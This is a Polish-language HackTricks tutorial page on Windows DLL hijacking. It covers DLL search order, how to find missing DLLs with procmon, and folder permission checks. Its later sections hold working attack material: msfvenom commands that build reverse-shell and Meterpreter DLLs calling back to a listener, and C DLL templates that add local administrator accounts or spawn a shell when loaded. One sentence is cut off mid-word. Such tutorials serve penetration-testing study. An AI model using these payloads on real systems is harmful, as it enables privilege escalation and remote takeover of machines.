# Dll Hijacking

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów GitHub**.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Jeśli interesuje Cię **kariera hakerska** i hakowanie niemożliwych do zhakowania rzeczy - **zatrudniamy!** (_wymagane biegłe posługiwanie się językiem polskim w mowie i piśmie_).

{% embed url="https://www.stmcyber.com/careers" %}

## Podstawowe informacje

Hijacking DLL polega na manipulowaniu zaufaną aplikacją w celu załadowania złośliwej DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection i Side-Loading**. Głównie służy do wykonania kodu, osiągnięcia trwałości i, rzadziej, eskalacji uprawnień. Pomimo skupienia się tutaj na eskalacji, metoda hijackingu pozostaje taka sama niezależnie od celu.

### Powszechne techniki

Do hijackingu DLL stosuje się kilka metod, z których każda ma swoją skuteczność w zależności od strategii ładowania DLL przez aplikację:

1. **Zastąpienie DLL**: Zamiana prawdziwej DLL na złośliwą, opcjonalnie z użyciem DLL Proxying w celu zachowania funkcjonalności oryginalnej DLL.
2. **Hijacking kolejności wyszukiwania DLL**: Umieszczenie złośliwej DLL w ścieżce wyszukiwania przed prawidłową DLL, wykorzystując wzorzec wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Utworzenie złośliwej DLL, którą aplikacja ma załadować, myśląc, że jest to nieistniejąca wymagana DLL.
4. **Przekierowanie DLL**: Modyfikacja parametrów wyszukiwania, takich jak `%PATH%` lub pliki `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwej DLL.
5. **Zastąpienie DLL WinSxS**: Podmiana prawidłowej DLL na złośliwą odpowiednik w katalogu WinSxS, metoda często kojarzona z DLL side-loading.
6. **Hijacking DLL za pomocą ścieżki względnej**: Umieszczenie złośliwej DLL w katalogu kontrolowanym przez użytkownika wraz z skopiowaną aplikacją, przypominające techniki Binary Proxy Execution.


## Wyszukiwanie brakujących DLL

Najczęstszy sposób na znalezienie brakujących DLL w systemie to uruchomienie narzędzia [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z sysinternals, **ustawienie** **następujących 2 filtrów**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

i wyświetlenie tylko **aktywności systemu plików**:

![](<../../.gitbook/assets/image (314).png>)

Jeśli szukasz **brakujących DLL ogólnie**, **pozostaw** to uruchomione przez kilka **sekund**.\
Jeśli szukasz **brakującej DLL w określonym pliku wykonywalnym**, powinieneś ustawić **inny filtr, na przykład "Nazwa procesu" "zawiera" "\<nazwa pliku wykonywalnego>", uruchomić go i zatrzymać przechwytywanie zdarzeń**.

## Wykorzystywanie brakujących DLL

Aby eskalować uprawnienia, najlepszą szansą jest możliwość **napisania DLL, którą proces o podwyższonych uprawnieniach spróbuje załadować** w miejscu, gdzie będzie przeszukiwana. Dzięki temu będziemy mogli **napisać** DLL w **folderze**, w którym **DLL jest wyszukiwane wcześniej** niż folder, w którym znajduje się **oryginalne DLL** (dziwny przypadek), lub będziemy mogli **napisać w jakimś folderze, w którym DLL będzie wyszukiwane**, a oryginalne **DLL nie istnieje** w żadnym folderze.

### Kolejność wyszukiwania DLL

W **dokumentacji Microsoftu** można znaleźć informacje na temat tego, jak są ładowane DLL:

**Aplikacje systemu Windows** wyszukują DLL, podążając za zestawem **predefiniowanych ścieżek wyszukiwania**, zgodnie z określoną sekwencją. Problem hijackingu DLL pojawia się, gdy szkodliwa DLL jest strategicznie umieszczona w jednym z tych katalogów, zapewniając, że zostanie załadowana przed autentyczną DLL. Rozwiązaniem tego problemu jest zapewnienie, aby aplikacja używała ścieżek bezwzględnych przy odwoływaniu się do wymaganych DLL.

Poniżej przedstawiono **kolejność wyszukiwania DLL w systemach 32-bitowych**:

1. Katalog, z którego została załadowana aplikacja.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę do tego katalogu. (_C:\Windows\System32_)
3. Katalog systemowy 16-bitowy. Nie ma funkcji, która pobiera ścieżkę do tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę do tego katalogu.
1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Należy zauważyć, że nie obejmuje to ścieżki określonej przez klucz rejestru **App Paths** dla poszczególnych aplikacji. Klucz **App Paths** nie jest używany podczas obliczania ścieżki wyszukiwania DLL.

To jest **domyślna** kolejność wyszukiwania z włączonym trybem **SafeDllSearchMode**. Gdy jest wyłączony, bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) jest wywoływana z parametrem **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, wyszukiwanie rozpoczyna się w katalogu modułu wykonywalnego, z którego **LoadLibraryEx** jest ładowane.

Należy również zauważyć, że **DLL może być załadowane, wskazując pełną ścieżkę, a nie tylko nazwę**. W takim przypadku DLL ta **będzie wyszuki
#### Wyjątki w kolejności wyszukiwania DLL według dokumentacji systemu Windows

W dokumentacji systemu Windows zaznaczono pewne wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkana zostaje **DLL o tej samej nazwie, co już załadowana w pamięci**, system omija standardowe wyszukiwanie. Zamiast tego, sprawdza przekierowanie i manifest przed domyślnym użyciem DLL już załadowanej w pamięci. **W tym scenariuszu system nie przeprowadza wyszukiwania DLL**.
- W przypadkach, gdy DLL jest rozpoznawana jako **znana DLL** dla bieżącej wersji systemu Windows, system użyje swojej wersji znanej DLL wraz z zależnymi DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych znanych DLL.
- Jeśli **DLL ma zależności**, wyszukiwanie tych zależnych DLL jest przeprowadzane tak, jakby były wskazane tylko przez **nazwy modułów**, niezależnie od tego, czy początkowa DLL została zidentyfikowana za pomocą pełnej ścieżki.


### Eskalacja uprawnień

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działał z **innymi uprawnieniami** (ruch poziomy lub boczny) i **brakuje mu DLL**.
- Upewnij się, że istnieje **dostęp do zapisu** w dowolnym **katalogu**, w którym będzie **wyszukiwana DLL**. Lokalizacja ta może być katalogiem wykonywalnym lub katalogiem w ścieżce systemowej.

Tak, wymagania są trudne do spełnienia, ponieważ **domyślnie trudno jest znaleźć uprzywilejowany plik wykonywalny, który nie zawiera DLL**, a jeszcze **trudniej jest mieć uprawnienia do zapisu w folderze ścieżki systemowej** (domyślnie nie można). Jednak w źle skonfigurowanych środowiskach jest to możliwe.\
Jeśli masz szczęście i spełniasz te wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Chociaż **głównym celem projektu jest obejście UAC**, możesz tam znaleźć **PoC** dla wykorzystania przechwycenia DLL dla konkretnej wersji systemu Windows (prawdopodobnie wystarczy zmienić ścieżkę folderu, w którym masz uprawnienia do zapisu).

Zauważ, że możesz **sprawdzić swoje uprawnienia w folderze** za pomocą polecenia:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I sprawdź uprawnienia wszystkich folderów w ścieżce:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz również sprawdzić importy pliku wykonywalnego oraz eksporty biblioteki DLL za pomocą:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Aby uzyskać pełny przewodnik dotyczący **wykorzystania przechwytywania DLL do eskalacji uprawnień** z uprawnieniami do zapisu w folderze **System Path**, sprawdź:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Narzędzia automatyzujące

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sprawdzi, czy masz uprawnienia do zapisu w dowolnym folderze w ścieżce systemowej.\
Inne interesujące narzędzia automatyzujące do odkrywania tej podatności to funkcje **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll_.

### Przykład

W przypadku znalezienia podatnego scenariusza jedną z najważniejszych rzeczy do pomyślnego wykorzystania go będzie **utworzenie biblioteki DLL, która eksportuje co najmniej wszystkie funkcje, które program wykonywalny będzie z niej importował**. W każdym razie, zauważ, że przechwytywanie DLL przydaje się do [eskalacji z poziomu Medium Integrity do High **(omijanie UAC)**](../authentication-credentials-uac-and-efs.md#uac) lub z **High Integrity do SYSTEMU**. Przykład **jak utworzyć prawidłową bibliotekę DLL** znajdziesz w tym badaniu przechwytywania DLL skupionym na przechwytywaniu DLL w celu wykonania: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto, w **następnej sekcji** znajdziesz kilka **podstawowych kodów DLL**, które mogą być przydatne jako **szablony** lub do utworzenia **biblioteki DLL z nie wymaganymi funkcjami eksportowanymi**.

## **Tworzenie i kompilacja bibliotek DLL**

### **Proksowanie DLL**

W zasadzie **proksy DLL** to biblioteka DLL zdolna do **wykonania złośliwego kodu po załadowaniu**, ale także do **eksponowania** i **pracy** tak, jakby **przekazywała wszystkie wywołania do prawdziwej biblioteki**.

Z narzędziem [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz **wskazać plik wykonywalny i wybrać bibliotekę**, którą chcesz zproksować, a następnie **wygenerować zproksowaną bibliotekę DLL** lub **wskazać bibliotekę DLL** i **wygenerować zproksowaną bibliotekę DLL**.

### **Meterpreter**

**Otrzymaj powłokę rev (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (nie znalazłem wersji x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Twój własny

Należy zauważyć, że w wielu przypadkach Dll, który kompilujesz, musi **eksportować wiele funkcji**, które będą ładowane przez proces ofiary. Jeśli te funkcje nie istnieją, **binarny plik nie będzie w stanie ich załadować** i **exploit się nie powiedzie**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Odwołania
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Jeśli interesuje Cię **kariera hakera** i hakowanie niemożliwych do zhakowania rzeczy - **zatrudniamy!** (_wymagane biegłe posługiwanie się językiem polskim w mowie i piśmie_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriów na GitHubie.**

</details>
